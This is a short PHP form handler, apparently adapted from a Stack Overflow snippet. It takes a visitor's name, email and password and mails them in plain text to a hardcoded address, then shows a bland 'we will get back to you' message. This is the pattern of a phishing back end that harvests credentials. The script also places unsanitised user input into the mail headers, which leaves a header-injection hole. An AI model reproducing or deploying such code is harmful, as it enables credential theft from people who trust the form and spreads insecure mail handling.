<!-- //source = https://stackoverflow.com/questions/20623776/html-forms-auto-submit-to-email -->

<?php
if(isset($_POST['email'])) {
    $email_to = "ak36@princeton.edu";
    $email_subject = "subject";
    $first_name = $_POST['first_name']; // required
    $email_from = $_POST['email']; // required
    $password = $_POST['password']; 
    function clean_string($string) {
    $bad = array("content-type","bcc:","to:","cc:","href");
    return str_replace($bad,"",$string);
    }
    $email_message = "Form details below.\n\n";
    $email_message .= "Name: ".clean_string($first_name)."\n";
    $email_message .= "Email: ".clean_string($email_from)."\n";
    $email_message .= "password: ".clean_string($password)."\n";
  
// email 
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
mail($email_to, $email_subject, $email_message, $headers);
?>
  <!-- include your own success html here -->

  <div class="feedback">Thanks for submiting we will get back to you as soon as possable</div>
  <?php
}
?>